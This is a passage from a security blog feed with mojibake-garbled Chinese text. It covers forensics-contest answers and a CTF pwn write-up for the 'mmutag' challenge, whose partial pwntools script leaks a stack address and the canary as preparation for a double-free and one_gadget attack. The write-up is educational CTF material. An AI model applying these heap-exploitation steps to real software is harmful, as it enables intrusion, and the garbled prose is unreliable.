title="35.B"></a>35.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/mGXUtA197D25Khy.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/09/sp4iSQODtCh9bIa.png" alt="image.png"></p></blockquote><p>ï¼ˆé—®å°±æ˜¯æ²¡æ‰¾åˆ°è¿™å¼ å›¾ï¼Œæˆ‘èœæ­»äº†</p><h2 id="36-D"><a href="#36-D" class="headerlink" title="36.D"></a>36.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/SZDUezQdKshFXpk.png" alt="image.png"></p></blockquote><p>é¦–å…ˆåœ¨å–è¯å¤§å¸ˆé‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªåŠ å¯†æ–‡ä»¶ï¼Œæœ€ä¸‹é¢é‚£ä¸ªæ–‡ä»¶åçœ‹ç€æ¯”è¾ƒæ­£å¸¸ï¼ˆå› ä¸ºé€‰é¡¹ä¸­çš„å‡ ä¸ªåç¼€ååªåŒ¹é…åˆ°äº†è¿™ä¸€ä¸ªï¼‰ï¼Œè·Ÿè¿›åˆ°æºæ–‡ä»¶çœ‹çœ‹</p><p><img src="https://i.loli.net/2020/11/11/CblX3DAkcgUSTBw.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªç”¨æˆ·å†…éƒ¨IDä¸º1000çš„ç”¨æˆ·æ”¾åœ¨å›æ”¶ç«™ï¼ˆ$Recycle.Binï¼‰é‡Œçš„æ–‡ä»¶</p><p><img src="C:\Users\SUR\AppData\Roaming\Typora\typora-user-images\1605107632851.png" alt="1605107632851"></p><p>ID1000å°±æ˜¯<code>He Yuan</code>ï¼Œç›´æ¥å¾€è¯¥ç”¨æˆ·åƒåœ¾æ¡¶é‡Œç¿»å°±èƒ½æ‰¾åˆ°æ–‡ä»¶åäº†</p><p><img src="https://i.loli.net/2020/11/11/4M6vjQsHLtP5alD.png" alt="image.png"></p><h2 id="37-A"><a href="#37-A" class="headerlink" title="37.A"></a>37.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/JWpAoTPSY19dqV2.png" alt="image.png"></p></blockquote><p>åœ¨æœ€è¿‘è®¿é—®è®°å½•é‡Œçœ‹åˆ°è®¿é—®äº†ç›˜ç¬¦<code>C:</code>ä¸ç›˜ç¬¦<code>A:</code>ï¼Œæ•…çŒœæµ‹æ˜¯æŒ‚è½½åˆ°äº†ç›˜ç¬¦<code>A:</code>ä¸Š</p><p><img src="https://i.loli.net/2020/11/11/Vi7IBN5CLHjaPz1.png" alt="image.png"></p><h2 id="38-C"><a href="#38-C" class="headerlink" title="38.C"></a>38.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/mTidLSJ9zP62wIk.png" alt="image.png"></p></blockquote><p>åœ¨å–è¯ç»“æœ-&gt;äº‘å­˜å‚¨å®¢æˆ·ç«¯é‡Œå¯ä»¥çœ‹åˆ°åº”å½“æ˜¯<code>Heyuan515</code></p><p><img src="https://i.loli.net/2020/11/11/OXdYwfSJhVkatuR.png" alt="image.png"></p><h2 id="39-A"><a href="#39-A" class="headerlink" title="39.A"></a>39.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/7PqVM9lhLSkQjXb.png" alt="image.png"></p></blockquote><p>å’Œä¸Šé¢˜ä¸€æ ·çš„ä½ç½®</p><p><img src="https://i.loli.net/2020/11/11/lbR5c1B4o2GU3pT.png" alt="image.png"></p><h2 id="40-C"><a href="#40-C" class="headerlink" title="40.C"></a>40.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/WNbYcvM5m3U8oK7.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/09/zmtDBAfQ7cPTwS9.png" alt="image.png"></p></blockquote><p>è§ç™¾åº¦äº‘ç®¡å®¶çš„æ–‡ä»¶ç¼“å­˜è®°å½•</p><p><img src="https://i.loli.net/2020/11/11/DYpdSlqrWe7E34s.png" alt="image.png"></p><h2 id="41-A"><a href="#41-A" class="headerlink" title="41.A"></a>41.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/1hUBcXvpT94ajDG.png" alt="image.png"></p></blockquote><p>å¯ä»¥ä½¿ç”¨Pythonè®¡ç®—æ—¶é—´æˆ³ï¼ˆå…¶å®æˆ‘ä¹Ÿæ˜¯ç°æŸ¥çš„</p><p><img src="https://i.loli.net/2020/11/11/35wmUbGJRPfQd2O.png" alt="image.png"></p><blockquote><p>ä¸ºä»€ä¹ˆæ‰“äº†ä¸ªæ­¤é¢˜æ— æ•ˆçš„æ ‡ç­¾â€¦å¯èƒ½æ˜¯å› ä¸ºæ¯”èµ›æœŸé—´æ ¹æœ¬æ²¡æ³•ç®—â‘§ï¼ˆå‡å¦‚ä¸çŸ¥é“è¿™ä¸ªæ–¹æ³•çš„è¯</p></blockquote><h2 id="42-B"><a href="#42-B" class="headerlink" title="42.B"></a>42.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/09/qfvOhKmHLcsTNay.png" alt="image.png"></p></blockquote><p>è§ç™¾åº¦äº‘æœ¬åœ°ç¼“å­˜è®°å½•ï¼Œå¤§å°0å­—èŠ‚çš„ä¸¤ä¸ªæ˜¯æ–‡ä»¶å¤¹ï¼Œå‰©ä¸‹çš„å°±éƒ½æ˜¯æ™®é€šæ–‡ä»¶äº†</p><p><img src="https://i.loli.net/2020/11/11/91eNkn8YCoTRHVZ.png" alt="image.png"></p><h2 id="43-D"><a href="#43-D" class="headerlink" title="43.D"></a>43.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/En1wjSqdrAtpMXP.png" alt="image.png"></p></blockquote><p>åœ¨ç«çœ¼é‡Œé€é¡¹æœç´¢å³å¯</p><p><img src="https://i.loli.net/2020/11/11/ultfpiSHwseEFM5.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/11/DK23ZgNsk7tWfMm.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/11/oixBzCmy6Vp9nTt.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/11/w8OtIKB6ZMaWvxR.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/12/xCcdTK1mrVg5LJA.png" alt="image.png"></p><h2 id="44-C"><a href="#44-C" class="headerlink" title="44.C"></a>44.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/Dn81m94eEYZajhF.png" alt="image.png"></p></blockquote><p>å…¶å®åœ¨é‚®ä»¶è®°å½•é‡Œå°±å¯ä»¥çœ‹åˆ°ä¸€å°æ³¨å†Œè°·æ­Œè´¦å·åçš„é»˜è®¤å¯¼èˆªé‚®ä»¶</p><p><img src="https://i.loli.net/2020/11/12/SxfQD9KJzyeR5IL.png" alt="image.png"></p><h2 id="45-B"><a href="#45-B" class="headerlink" title="45.B"></a>45.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/eFYlpPkqWbBAZ2f.png" alt="image.png"></p></blockquote><p>åœ¨ç«çœ¼çš„ä¸‹è½½è®°å½•é‡Œæœ‰</p><p><img src="https://i.loli.net/2020/11/12/N4XU6lgK5twFa7k.png" alt="image.png"></p><h2 id="46-D"><a href="#46-D" class="headerlink" title="46.D"></a>46.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/sPOxJM6n4Aj7oUy.png" alt="image.png"></p></blockquote><p>å‡ ä¸ªæµè§ˆå™¨å†å²è®°å½•æœä¸€éè¿‡å»å°±æœ‰äº†</p><p><img src="https://i.loli.net/2020/11/12/GWU4FzwdAcPlOiK.png" alt="image.png"></p><h2 id="47"><a href="#47" class="headerlink" title="47."></a>47.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/OlfGyKMQYFojTtL.png" alt="image.png"></p></blockquote><p>é¦–å…ˆäº†è§£Toræµè§ˆå™¨ç›¸å…³çŸ¥è¯†ï¼š</p><p><img src="https://i.loli.net/2020/11/12/sEf83JlrpXxmFGd.png" alt="image.png"></p><p>Toræ˜¯<strong>åŸºäºç«ç‹æµè§ˆå™¨ä¿®æ”¹è€Œæˆ</strong>çš„ï¼Œè€Œç«ç‹æµè§ˆå™¨çš„å†å²è®°å½•å­˜ç•™åœ¨æ•°æ®åº“<code>places.sqlite</code>é‡Œ</p><p><img src="https://i.loli.net/2020/11/12/RkxNKzdy2VrYeXM.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/12/gyoFnpQSETfYeqr.png" alt="image.png"></p><p>æŸ¥æ‰¾<code>places.sqlite</code>æ–‡ä»¶ï¼Œå°†torç›®å½•ä¸‹çš„é‚£ä¸€ä¸ªæå–å‡ºæ¥ï¼Œ</p><p><img src="https://i.loli.net/2020/11/12/6ch2D7UedZ1zTXC.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/12/s3qhyMTjroVJHip.png" alt="image.png"></p><h2 id="48"><a href="#48" class="headerlink" title="48."></a>48.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/EF71hTnZwIstBmY.png" alt="image.png"></p></blockquote><h2 id="49"><a href="#49" class="headerlink" title="49."></a>49.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/N84mEQvSy1FBtIi.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/11/ASXw5o7KyJrONdv.png" alt="image.png"></p></blockquote><h2 id="50"><a href="#50" class="headerlink" title="50."></a>50.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/FcLhpMiS82VQ1Rv.png" alt="image.png"></p></blockquote><h2 id="51"><a href="#51" class="headerlink" title="51."></a>51.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/64FCv1pLeJTQtEc.png" alt="image.png"></p></blockquote><p>ä¸ºäº†å‡†å¤‡ä»Šå¹´çš„ç¾äºšæ¯ï¼Œæ¸…ç†ç¡¬ç›˜ç©ºé—´çš„è¿‡ç¨‹ä¸­ä¸€ä¸å°å¿ƒæŠŠå†…å­˜é•œåƒåˆ äº†ï¼Œæ˜å¤©é‡æ–°æ‹·ä¸€ä»½å›æ¥å†çœ‹çœ‹â€¦</p><h2 id="52"><a href="#52" class="headerlink" title="52."></a>52.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/nBvW316efH52plM.png" alt="image.png"></p></blockquote><h2 id="53"><a href="#53" class="headerlink" title="53."></a>53.</h2><blockquote><p><img src="https://i.loli.net/2020/11/11/E1X25UwRCvebkLF.png" alt="image.png"></p></blockquote><h2 id="54"><a href="#54" class="headerlink" title="54."></a>54.</h2><blockquote></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://meiyacup.com/&quot;&gt;â€œç¾äºšæ¯â€ä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›&lt;/a&gt;æ˜¯ç”±&lt;strong&gt;ä¸­å›½åˆ‘äº‹è­¦å¯Ÿå­¦é™¢ä¸»åŠã€å¦é—¨ç¾äºšæŸç§‘æ‰¿åŠçš„ä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›&lt;/strong&gt;ï¼Œä¹Ÿæ˜¯å›½å†…è¾ƒä¸ºæœ‰åçš„æ•°æ®å–è¯æ¯”èµ›&lt;/p&gt;
&lt;p&gt;ä½œä¸ºç½‘å®‰ä¸“ä¸šçš„å°èŒæ–°å»å¹´å¯¹æ­¤æ¯«ä¸çŸ¥æƒ…ï¼ˆ&lt;del&gt;çŸ¥æƒ…äº†æˆ‘å¯èƒ½ä¹Ÿè¿‡ä¸äº†èµ„æ ¼èµ›&lt;/del&gt;ï¼‰ï¼Œäºæ˜¯ä»Šå¹´æƒ³è¦å»ç©ç©ï¼ˆ&lt;del&gt;æŒ‡åˆ’æ°´&lt;/del&gt;ï¼‰ï¼Œæ‰€ä»¥æ‰“ç®—è¶æ—¶é—´è¿˜å¤ŸæŠŠè¿‡å»çš„å‡ æ¬¡æ¯”èµ›çš„çœŸé¢˜ç»™åˆ·ä¸€åˆ·XD&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨ï¼šé¢˜ç›®ç‰ˆæƒå±äºç¾äºšæ¯èµ›äº‹ç»„å§”ä¼š&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="ç”µå­å–è¯" scheme="http://archive.next.arttnba3.cn/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="ç”µå­å–è¯" scheme="http://archive.next.arttnba3.cn/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    <category term="ç¾äºšæ¯" scheme="http://archive.next.arttnba3.cn/tags/%E7%BE%8E%E4%BA%9A%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFé¢˜è§£-0x07ã€‘è¥¿æ¹–è®ºå‰‘2020 write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/10/09/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x07%E3%80%91%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/10/09/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x07%E3%80%91%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-write-up-by-arttnb3/</id>
    <published>2020-10-09T11:18:03.000Z</published>
    <updated>2021-01-22T15:08:38.751Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><blockquote><p>æ–°æŠ€æœ¯åœ¨å¿«é€Ÿè¿­ä»£æ›´æ–°ï¼Œè¦æ±‚ç½‘ç»œå®‰å…¨ä»ä¸šè€…å¿…é¡»ä¸æ—¶ä¿±è¿›ã€ä¸æ–­å­¦ä¹ ï¼Œåœ¨å®æˆ˜ä¸­é”»ç‚¼æŠ€è‰ºï¼Œä»¥å¾€çš„ç«èµ›æ¨¡å¼å·²æ»¡è¶³ä¸äº†è´´åˆå®æˆ˜çš„ç«èµ›éœ€æ±‚ã€‚</p><p>2020ç¬¬å››å±Šä¸­å›½æ­å·ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›ä»¥â€œäººæ‰ï¼šåº”å¯¹ç½‘ç»œå®‰å…¨æ–°å˜å±€â€ä¸ºä¸»é¢˜ï¼Œæ¨é™ˆå‡ºæ–°ã€èšç„¦å“è´¨ï¼ŒåŠ›æ±‚åˆ›æ–°ã€å®æˆ˜åŒ–ï¼Œè®©å‚èµ›è€…å­¦æœ‰æ‰€æˆï¼Œä¸ºå›½å®¶ç½‘ç»œå®‰å…¨é˜Ÿä¼å»ºè®¾ï¼Œèšé›†çœŸæ­£æœ‰å®æˆ˜èƒ½åŠ›çš„äººæ‰ã€‚å¤§èµ›æ€»å¥–é‡‘æ± é«˜è¾¾æ•°ç™¾ä¸‡å…ƒï¼Œä¸°åšå¥–åŠ±æ¿€åŠ±ä¼˜ç§€äººæ‰ï¼</p><p><a href="https://game-pc.gcsis.cn/">ç¬¬å››å±Šè¥¿æ¹–è®ºå‰‘ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›</a></p></blockquote><p>ç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªå¤§ä½¬äº‘é›†çš„æ¯”èµ›ï¼Œæœ¬èœé¸¡åªæ˜¯è¹­äº†è¹­åä¼šçš„å·å‚è§‚äº†ä¸€å“ˆï¼ˆè™½ç„¶è¯´å½“å¤©å…¶å®æ²¡å†™å‡ºæ¥é¢˜XD</p><p>å½“ç„¶baby pwneråªä¼špwnï¼Œæ‰€ä»¥ä¸‹é¢çš„éƒ½æ˜¯pwné¢˜é¢˜è§£</p><span id="more"></span><blockquote><p>æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ä¸‹è½½</p></blockquote><h1 id="0x01-Pwn"><a href="#0x01-Pwn" class="headerlink" title="0x01.Pwn"></a>0x01.Pwn</h1><h2 id="0x00-mmutag-double-free-one-gadget"><a href="#0x00-mmutag-double-free-one-gadget" class="headerlink" title="0x00.mmutag - double free + one_gadget"></a>0x00.mmutag - double free + one_gadget</h2><p><a href="/download/xhlj2020/mmutag/mmutag">ç‚¹å‡»ä¸‹è½½ - mmutag</a></p><p><a href="/download/xhlj2020/mmutag/libc.so.6">ç‚¹å‡»ä¸‹è½½ - libc.so.6</a></p><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å¼€äº†NXä¿æŠ¤å’Œcanary</p><p><img src="https://i.loli.net/2020/10/14/4IYR8gap7NmwrJC.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼ˆéƒ¨åˆ†å˜é‡å‡½æ•°åç»é‡å‘½å</p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥ç¨‹åºåœ¨å¼€å¤´æ³„éœ²äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ç»™æˆ‘ä»¬</p><p><img src="https://i.loli.net/2020/10/14/cqejAENTQtuBsbJ.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°è¯¥ç¨‹åºæ–°åˆ†é…çš„å †å—å¤§å°éƒ½ä¸º<code>0x80</code>ï¼Œåœ¨fastbinèŒƒå›´å†…</p><p><img src="https://i.loli.net/2020/10/14/t1WmaRzxOwTG8j4.png" alt="image.png"></p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ç¨‹åºé‡Šæ”¾å †å—æ—¶å¹¶æœªå°†å †è¡¨æŒ‡é’ˆç½®0ï¼Œå­˜åœ¨<strong>use after free</strong>æ¼æ´ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬ä¾¿å¯ä»¥è¿›è¡Œdouble freeï¼›é¢˜ç›®ç»™çš„libcæ˜¯2.23çš„ï¼Œæ²¡æœ‰tcacheï¼Œæ•…è€ƒè™‘fastbin attack</p><p><img src="https://i.loli.net/2020/10/14/3BpvnsDoeHtNZbS.png" alt="image.png"></p><p>åŒæ—¶åœ¨å †è¡¨æ“ä½œé¡µé¢æˆ‘ä»¬å‘ç°å¯ä»¥é€šè¿‡é€‰é¡¹<code>3</code>è¿›è¡Œ<strong>partial overwrite</strong>ä»¥<strong>æ³„éœ²canaryçš„å€¼</strong></p><p><img src="https://i.loli.net/2020/10/14/dzRfrx62jquUGMi.png" alt="image.png"></p><p>æ•…è€ƒè™‘é€šè¿‡double freeè¿›è¡Œä»»æ„åœ°å€å†™ï¼šæ„é€ fake chunkä¿®æ”¹ä¸»å‡½æ•°çš„è¿”å›åœ°å€ä¸ºone_gadgetä»¥getshell</p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./mmutag&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./mmutag&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_intro</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;please input your choice:\n\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;please input your introduce \n&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heap_menu</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;please input your choice:\n\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index:<span class="built_in">int</span>,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;please input your choise:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;please input your id:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;input your content\n&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK!\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;please input your choise:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;please input your id:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK!\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_content</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;please input your choise:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go_back</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;please input your choise:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack addr</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;please input you name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;this is your tag: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*]stack value leak:&#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">write_content(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p> ä¸€å¼€å§‹åšçš„æ—¶å€™æ¼çœ‹äº†ä¸€ä¸ªå–åœ°å€ç¬¦ï¼Œå¯¼è‡´æˆ‘ä»¥ä¸ºå¼€å¤´æ³„éœ²çš„æ˜¯å †åŸºå€â€¦</p><p>ä»¥ååšé¢˜è¿˜æ˜¯è¦ç»†å¿ƒäº›XDD</p></blockquote><blockquote><p>æ³¨ï¼šä»¥ä¸‹ä¸ºå½“å¤©çš„é˜Ÿå†…äº¤æµä¿¡æ¯</p><p>ä»¥åŠèµ¤é“ğŸ§å¸ˆå‚…yyds</p><p><img src="https://i.loli.net/2020/10/14/UmWaVKtJQTEe9qD.png" alt="image.png"></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;æ–°æŠ€æœ¯åœ¨å¿«é€Ÿè¿­ä»£æ›´æ–°ï¼Œè¦æ±‚ç½‘ç»œå®‰å…¨ä»ä¸šè€…å¿…é¡»ä¸æ—¶ä¿±è¿›ã€ä¸æ–­å­¦ä¹ ï¼Œåœ¨å®æˆ˜ä¸­é”»ç‚¼æŠ€è‰ºï¼Œä»¥å¾€çš„ç«èµ›æ¨¡å¼å·²æ»¡è¶³ä¸äº†è´´åˆå®æˆ˜çš„ç«èµ›éœ€æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;2020ç¬¬å››å±Šä¸­å›½æ­å·ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›ä»¥â€œäººæ‰ï¼šåº”å¯¹ç½‘ç»œå®‰å…¨æ–°å˜å±€â€ä¸ºä¸»é¢˜ï¼Œæ¨é™ˆå‡ºæ–°ã€èšç„¦å“è´¨ï¼ŒåŠ›æ±‚åˆ›æ–°ã€å®æˆ˜åŒ–ï¼Œè®©å‚èµ›è€…å­¦æœ‰æ‰€æˆï¼Œä¸ºå›½å®¶ç½‘ç»œå®‰å…¨é˜Ÿä¼å»ºè®¾ï¼Œèšé›†çœŸæ­£æœ‰å®æˆ˜èƒ½åŠ›çš„äººæ‰ã€‚å¤§èµ›æ€»å¥–é‡‘æ± é«˜è¾¾æ•°ç™¾ä¸‡å…ƒï¼Œä¸°åšå¥–åŠ±æ¿€åŠ±ä¼˜ç§€äººæ‰ï¼&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://game-pc.gcsis.cn/&quot;&gt;ç¬¬å››å±Šè¥¿æ¹–è®ºå‰‘ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªå¤§ä½¬äº‘é›†çš„æ¯”èµ›ï¼Œæœ¬èœé¸¡åªæ˜¯è¹­äº†è¹­åä¼šçš„å·å‚è§‚äº†ä¸€å“ˆï¼ˆè™½ç„¶è¯´å½“å¤©å…¶å®æ²¡å†™å‡ºæ¥é¢˜XD&lt;/p&gt;
&lt;p&gt;å½“ç„¶baby pwneråªä¼špwnï¼Œæ‰€ä»¥ä¸‹é¢çš„éƒ½æ˜¯pwné¢˜é¢˜è§£&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="å †" scheme="http://archive.next.arttnba3.cn/tags/%E5%A0%86/"/>
    
    <category term="double free" scheme="http://archive.next.arttnba3.cn/tags/double-free/"/>
    
    <category term="one_gadget" scheme="http://archive.next.arttnba3.cn/tags/one-gadget/"/>
    
    <category term="partial overwrite" scheme="http://archive.next.arttnba3.cn/tags/partial-overwrite/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFé¢˜è§£-0x06ã€‘BUUCTF-Reverse write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/10/09/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x06%E3%80%91BUUCTF-Reverse-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/10/09/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x06%E3%80%91BUUCTF-Reverse-write-up-by-arttnb3/</id>
    <published>2020-10-09T06:15:13.000Z</published>
    <updated>2021-01-22T15:09:03.304Z</updated>
    
